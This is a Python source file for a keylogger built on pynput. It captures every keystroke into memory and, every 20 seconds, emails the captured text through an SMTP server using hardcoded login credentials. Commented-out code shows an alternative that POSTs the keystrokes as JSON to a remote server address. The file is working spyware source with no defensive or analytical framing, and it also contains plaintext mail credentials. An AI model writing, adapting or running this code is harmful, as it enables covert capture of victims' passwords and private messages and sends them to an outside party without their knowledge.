# Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading
# To sends emails
import smtplib

from email.mime.text import MIMEText

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.

text = ""
SMTPserver = 'sandbox.smtp.mailtrap.io'
sender = 'dedime2754@gam1fy.com'
destination = ['dedime2754@gam1fy.com']

USERNAME = "ce2902da7c6a22"
PASSWORD = "694ea16665a8f8"

# typical values for text_subtype are plain, html, xml
text_subtype = 'plain'


# Time interval in seconds for code to execute.
time_interval = 20


def send_post_req():

    content = """\
    Test message
    """
    subject = "Sent from Python"

    # try:
    # # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
    # # the format {"keyboardData" : "<value_of_text>"}
    # payload = json.dumps({"keyboardData" : text})
    # # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
    # # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
    # r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
    # # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
    # timer = threading.Timer(time_interval, send_post_req)
    # # We start the timer thread.
    # timer.start()
    try:
        content += text
        msg = MIMEText(content, text_subtype)
        msg['Subject'] = subject
        # some SMTP servers will do this automatically, not all
        msg['From'] = sender

        # context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        # connection = smtplib.SMTP('smtp-mail.outlook.com', 587)
        # connection.ehlo()
        # connection.starttls(context=context)
        # connection.ehlo()

        conn = smtplib.SMTP(SMTPserver, 2525)
        conn.set_debuglevel(False)
        conn.login(USERNAME, PASSWORD)
        try:
            conn.sendmail(sender, destination, msg.as_string())
        finally:
            conn.quit()
        # sender = "<dedime2754@gam1fy.com>"
        # receiver = "<dedime2754@gam1fy.com>"
        # marker = "AUNIQUEMARKER"
        # body += text

        # m = f"""\
        # Subject: main Mailtrap
        # To: {receiver}
        # From: {sender}
        # Keylogger by aydinnyunus\n"""

        # part1 = """From: From Person < me@fromdomain.net >
        # To: To Person < amrood.admin@gmail.com >
        # Subject: Sending Attachement
        # MIME-Version: 1.0
        # Content-Type: multipart/mixed; boundary = %s
        # -- % s
        # """ % (marker, marker)

        # # Define the message action
        # part2 = """Content-Type: text/plain
        # Content-Transfer-Encoding: 8bit

        # %s
        # -- % s
        # """ % (body, marker)

        # # print(text)
        # # payload = json.dumps({"keyboardData": text})
        # # print(payload)

        # message = part1 + part2
        # with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as server:
        #     server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        #     server.sendmail(sender, receiver, message)
        # print(message)
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(e)
    #     print("Couldn't complete request!")

    # We only need to log the key once it is released. That way it takes the modifier keys into consideration.


def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.
# Read more on the different keys that can be logged here:
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")
        print(text)


# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
        on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
